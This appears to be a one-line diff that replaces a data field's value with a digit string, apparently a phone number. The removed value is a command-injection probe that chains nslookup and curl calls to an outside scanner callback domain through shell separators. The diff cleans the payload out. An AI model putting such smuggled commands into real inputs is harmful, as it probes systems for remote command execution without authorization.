@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitphgoeqvxht1c6e3.bxss.me||curl hitphgoeqvxht1c6e3.bxss.me)|(nslookup -q=cname hitphgoeqvxht1c6e3.bxss.me||curl hitphgoeqvxht1c6e3.bxss.me)&(nslookup -q=cname hitphgoeqvxht1c6e3.bxss.me||curl hitphgoeqvxht1c6e3.bxss.me)
+5559001340
